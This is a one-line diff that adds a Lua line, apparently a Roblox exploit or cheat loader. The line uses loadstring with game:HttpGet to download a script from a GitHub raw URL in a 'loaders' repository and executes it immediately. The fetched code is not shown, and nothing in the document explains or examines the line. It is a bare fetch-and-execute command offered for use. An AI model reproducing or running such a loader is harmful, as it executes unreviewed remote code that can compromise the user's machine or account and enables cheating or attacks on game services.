@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/blackbarbarianpush/loaders/main/loaders/it-wants-in-horror-spam2-7y8u8slxodl9ol.lua"))()
